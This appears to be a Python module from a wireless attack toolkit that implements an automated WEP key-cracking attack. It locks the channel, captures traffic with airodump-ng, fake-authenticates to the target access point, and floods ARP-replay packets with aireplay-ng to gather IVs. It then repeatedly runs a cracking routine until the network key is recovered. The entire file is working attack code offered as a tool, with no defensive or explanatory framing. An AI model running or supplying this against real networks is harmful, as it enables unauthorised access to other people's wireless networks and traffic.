"""WEP attack: fake-auth + ARP-replay to gather IVs, then aircrack-ng."""

from __future__ import annotations

import glob
import os
import time

from anywifi.attacks.base import Attack
from anywifi.config import WEP_ATTACK_TIME
from anywifi.crack.cracker import crack_wep
from anywifi.model import AttackContext, AttackResult, Network


class WepAttack(Attack):
    vector = "wep"
    label = "WEP (ARP-replay + aircrack)"

    def applicable(self, net: Network) -> bool:
        return net.is_wep

    def run(self, net: Network, ctx: AttackContext) -> AttackResult:
        runner = ctx.runner
        iface = ctx.interface
        prefix = os.path.join(str(ctx.output_dir), f"wep_{_safe(net.bssid)}")

        # 1) Lock the channel and start a targeted capture
        runner.run(["iw", "dev", iface, "set", "channel", str(net.channel)])
        dump = runner.spawn([
            "airodump-ng", "-c", str(net.channel), "--bssid", net.bssid,
            "-w", prefix, "--output-format", "pcap", iface,
        ])

        # 2) Fake authentication (associate with the AP)
        runner.run(
            ["aireplay-ng", "--fakeauth", "0", "-a", net.bssid, iface],
            timeout=30,
        )
        # 3) Speed up IV generation with ARP-replay
        replay = runner.spawn(
            ["aireplay-ng", "--arpreplay", "-b", net.bssid, iface]
        )

        # 4) Periodically try to recover the key
        password = None
        try:
            deadline = time.time() + WEP_ATTACK_TIME
            while time.time() < deadline:
                if ctx.dry_run:
                    break
                ctx.status("collecting IVs via ARP-replay…")
                time.sleep(20)
                cap = _latest(prefix)
                if cap:
                    ctx.status("trying to recover the WEP key…")
                    password = crack_wep(runner, cap, net.bssid)
                    if password:
                        break
        finally:
            runner.stop(replay)
            runner.stop(dump)

        cap = _latest(prefix)
        if password:
            return self._result(
                net, success=True, password=password, capture_file=cap,
                message="WEP key recovered",
            )
        return self._result(
            net, success=False, capture_file=cap,
            message="Not enough IVs / key not recovered",
        )


def _safe(bssid: str) -> str:
    return bssid.replace(":", "")


def _latest(prefix: str):
    files = sorted(glob.glob(prefix + "*.cap"))
    return files[-1] if files else None
